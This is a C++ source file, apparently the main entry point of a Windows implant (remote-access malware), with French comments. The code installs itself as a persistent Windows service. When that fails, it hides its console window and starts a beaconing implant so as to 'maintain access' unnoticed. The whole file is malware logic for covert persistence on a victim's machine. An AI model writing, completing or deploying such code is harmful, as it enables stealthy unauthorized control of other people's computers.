#include "beacon.h"
#include "persistence.h"
#include "service.h"
#include "log.h"
#include <windows.h>
#include <string>

int main(int argc, char** argv) {
    // Mode installation explicite via la ligne de commande
    if (argc > 1 && std::string(argv[1]) == "--install") {
        return install_persistence() ? 0 : 1;
    }

    // 1. Tenter de se connecter au SCM (si lance par le Service Control Manager)
    int res = run_as_service();
    if (res == ERROR_FAILED_SERVICE_CONTROLLER_CONNECT) {
        // 2. Si on n'est pas lance par le SCM :
#ifdef NDEBUG
        // En Release : on tente d'installer et de demarrer le service Windows.
        // Si l'installation reussit, le processus d'installation quitte pour
        // laisser le service tourner seul en arriere-plan (evite le double beacon).
        if (install_persistence()) {
            return 0;
        }

        // Si l'installation a echoue (ex: non-admin), on tourne directement
        // en console masquee pour maintenir l'acces.
        ShowWindow(GetConsoleWindow(), SW_HIDE);
        start_implant();
        return 0;
#else
        // En Debug : on configure la persistance mais on execute l'implant dans
        // la console courante pour afficher les logs en direct.
        install_persistence();
        start_implant();
        return 0;
#endif
    }
    return res;
}
